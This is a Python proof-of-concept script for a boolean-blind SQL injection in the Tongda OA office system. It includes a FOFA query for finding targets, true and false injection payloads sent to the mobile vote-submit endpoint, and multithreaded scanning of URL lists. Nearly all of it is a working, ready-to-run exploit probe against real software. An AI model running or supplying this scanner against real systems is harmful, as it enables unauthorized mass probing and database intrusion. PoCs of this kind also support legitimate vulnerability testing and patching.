#FOFA: title=“通达OA 网络智能办公系统”

import requests
import re
import argparse
import urllib3
import urllib
from urllib.parse import urlparse
from multiprocessing.dummy import Pool
import random
import string
import json

urllib3.disable_warnings()

proxy = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}

def banner():
    info = """
   _____                __          __        _        _                 
  / ____|               \ \        / /       | |      | |                
 | |  __ _ __ __ _ ___ __\ \  /\  / /__  _ __| | _____| |__   ___  _ __  
 | | |_ | '__/ _` / __/ __\ \/  \/ / _ \| '__| |/ / __| '_ \ / _ \| '_ \ 
 | |__| | | | (_| \__ \__ \\  /\  / (_) | |  |   <\__ \ | | | (_) | |_) |
  \_____|_|  \__,_|___/___/ \/  \/ \___/|_|  |_|\_\___/_| |_|\___/| .__/ 
                                                                  | |    
                                                                  |_|    
"""
    print(info)

def poc(target):
    result = {
        'name': '通达OA sqli-布尔盲注(/mobile/api/qyapp.vote.submit.php)',
        'vulnerable': False,
        'url': target,
        'method': 'post',
        'position': 'data',
        'param': 'submitData'
    }
    timeout = 3
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0',
        "Content-Type": "application/x-www-form-urlencoded"
    }
    payload = '/mobile/api/qyapp.vote.submit.php'
    vurl = urllib.parse.urljoin(target, payload)
    sqli_data_true = 'submitData={"a":{"vote_type":"1","vote_id":"if((select 995=995),1,2*1e308)","value":"1"}}'
    sqli_data_false = 'submitData={"a":{"vote_type":"1","vote_id":"if((select 3353=14451),1,2*1e308)","value":"1"}}'
    try:
        rep1 = requests.get(vurl, timeout=timeout, verify=False)
        if rep1.status_code == 200:
            true_rep = requests.post(vurl, headers=headers, data=sqli_data_true, timeout=timeout, verify=False)
            false_rep = requests.post(vurl, headers=headers, data=sqli_data_false, timeout=timeout, verify=False)
            if len(false_rep.text) > len(true_rep.text) and re.search("请联系管理员", false_rep.text):
                result['vulnerable'] = True
                result['vurl'] = vurl
                result['payload'] = sqli_data_true
                print(result)
    except:
        print(f"{target}访问失败")

def main():
    parser = argparse.ArgumentParser("通达OA sqli-布尔盲注漏洞检测POC")
    parser.add_argument("-u", "--url", dest="url", help="Insert URL")
    parser.add_argument("-f", "--file", dest="file", help="Insert URLs file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r') as uf:
            urls = []
            for u in uf.readlines():
                urls.append(u.strip())
            mp = Pool(10)
            mp.map(poc, urls)
            mp.close()
            mp.join()
    else:
        print("输入有误，请检查")

if __name__ == '__main__':
    banner()
    main()